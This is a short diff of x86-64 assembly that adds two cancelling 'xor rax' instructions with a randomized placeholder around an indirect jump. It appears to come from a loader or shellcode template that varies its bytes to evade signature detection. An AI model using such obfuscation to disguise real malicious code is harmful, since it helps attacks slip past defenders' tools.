@@ -86,6 +86,7 @@ final:
     mov eax,[r8+rcx*4]
     add rax,rdx
     pop r8
+    xor rax,%RANDOM__2%
     pop r8
     pop rsi
     pop rcx
@@ -95,6 +96,7 @@ final:
     pop r10
     sub rsp,byte 0x20
     push r10
+    xor rax,%RANDOM__2%
     jmp rax
 
 pre_load_next_module:
